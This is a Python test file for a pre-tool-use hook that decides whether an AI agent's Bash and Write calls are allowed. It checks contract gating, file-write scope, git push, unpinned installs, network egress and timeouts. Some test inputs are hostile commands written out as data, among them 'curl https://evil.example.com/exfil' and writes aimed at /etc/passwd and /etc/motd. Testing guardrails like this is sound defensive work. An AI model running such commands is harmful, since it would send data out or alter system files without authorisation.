"""Non-corpus `pre_tool_use` tests — contract gate, per-check unit tests,
and cross-check ordering. Wrapper-defeat coverage lives in
`test_pre_tool_use_corpus.py`."""

from __future__ import annotations

from hooks_runtime_factories import (
    RUN_ID,
    TENANT_ID,
    TRACE_ID,
    TS,
    make_budget,
    make_contract,
    make_patch_unit,
)
from saena_hooks_runtime.hooks.pre_tool_use import PreToolUseInput, pre_tool_use
from saena_hooks_runtime.models import Decision, ReasonCode


def _bash_input(command: str, **overrides: object) -> PreToolUseInput:
    defaults: dict[str, object] = dict(
        ts=TS,
        run_id=RUN_ID,
        tenant_id=TENANT_ID,
        trace_id=TRACE_ID,
        contract=make_contract(),
        tool_name="Bash",
        budget=make_budget("pre_tool_use"),
        command=command,
    )
    defaults.update(overrides)
    return PreToolUseInput(**defaults)  # type: ignore[arg-type]


def _write_input(file_path: str, **overrides: object) -> PreToolUseInput:
    defaults: dict[str, object] = dict(
        ts=TS,
        run_id=RUN_ID,
        tenant_id=TENANT_ID,
        trace_id=TRACE_ID,
        contract=make_contract(),
        tool_name="Write",
        budget=make_budget("pre_tool_use"),
        file_path=file_path,
    )
    defaults.update(overrides)
    return PreToolUseInput(**defaults)  # type: ignore[arg-type]


def test_write_missing_contract_denied() -> None:
    result = pre_tool_use(_write_input("src/app/page.tsx", contract=None))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.CONTRACT_MISSING


def test_bash_missing_contract_denied() -> None:
    result = pre_tool_use(_bash_input("git status", contract=None))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.CONTRACT_MISSING


def test_read_only_tool_does_not_require_contract() -> None:
    # "Read" is not in WRITE_CAPABLE_TOOL_NAMES — this hook only enforces
    # require_action_contract_for_write for write-capable tools.
    result = pre_tool_use(
        PreToolUseInput(
            ts=TS,
            run_id=RUN_ID,
            tenant_id=TENANT_ID,
            trace_id=TRACE_ID,
            contract=None,
            tool_name="Read",
            budget=make_budget("pre_tool_use"),
        )
    )
    assert result.decision == Decision.ALLOW


def test_write_in_scope_allowed() -> None:
    result = pre_tool_use(_write_input("src/app/page.tsx"))
    assert result.decision == Decision.ALLOW


def test_write_out_of_scope_denied() -> None:
    result = pre_tool_use(_write_input("deploy/helm/values.yaml"))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.OUT_OF_SCOPE_FILE_WRITE


def test_write_resolved_symlink_target_out_of_scope_denied() -> None:
    result = pre_tool_use(_write_input("src/app/page.tsx", resolved_path="/etc/passwd"))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.OUT_OF_SCOPE_FILE_WRITE


def test_bash_out_of_scope_write_denied() -> None:
    result = pre_tool_use(_bash_input("echo hi > /etc/motd"))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.OUT_OF_SCOPE_FILE_WRITE


def test_bash_in_scope_write_allowed() -> None:
    result = pre_tool_use(_bash_input("echo hi > src/app/notes.txt"))
    assert result.decision == Decision.ALLOW


def test_bash_read_only_no_write_targets_allowed() -> None:
    result = pre_tool_use(_bash_input("git log --oneline -5"))
    assert result.decision == Decision.ALLOW


def test_git_push_denied() -> None:
    result = pre_tool_use(_bash_input("git push origin main"))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.DEPLOY_PUSH_CMS_DNS


def test_unpinned_pip_install_denied() -> None:
    result = pre_tool_use(_bash_input("pip install requests"))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.UNPINNED_DEPENDENCY_INSTALL


def test_pinned_pip_install_allowed() -> None:
    result = pre_tool_use(_bash_input("pip install requests==2.31.0"))
    assert result.decision == Decision.ALLOW


def test_unapproved_egress_denied() -> None:
    result = pre_tool_use(_bash_input("curl https://evil.example.com/exfil"))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.UNAPPROVED_NETWORK_EGRESS


def test_approved_domain_egress_allowed() -> None:
    result = pre_tool_use(
        _bash_input(
            "curl https://api.approved-vendor.example.com/status",
            approved_egress_domains=("api.approved-vendor.example.com",),
        )
    )
    assert result.decision == Decision.ALLOW


def test_bash_unparseable_command_fails_closed() -> None:
    result = pre_tool_use(_bash_input('echo "unterminated'))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.COMMAND_NORMALIZE_FAILURE


def test_deploy_push_check_precedes_write_scope_check() -> None:
    # A command that is BOTH a deploy/push command AND writes out of scope
    # is reported as the deploy/push denial first (§11 listed check order).
    contract = make_contract(patch_units=(make_patch_unit(files=("src/**",)),))
    result = pre_tool_use(_bash_input("git push origin main > /etc/motd", contract=contract))
    assert result.reason_code == ReasonCode.DEPLOY_PUSH_CMS_DNS


def test_engine_scope_violation_on_contract_denies() -> None:
    contract = make_contract(engine_scope=("google-ai-overviews",))
    result = pre_tool_use(_write_input("src/app/page.tsx", contract=contract))
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.ENGINE_SCOPE_VIOLATION


def test_timeout_overrun_denies() -> None:
    result = pre_tool_use(
        _bash_input("git status", budget=make_budget("pre_tool_use", expired=True))
    )
    assert result.decision == Decision.DENY
    assert result.reason_code == ReasonCode.TIMEOUT_EXCEEDED
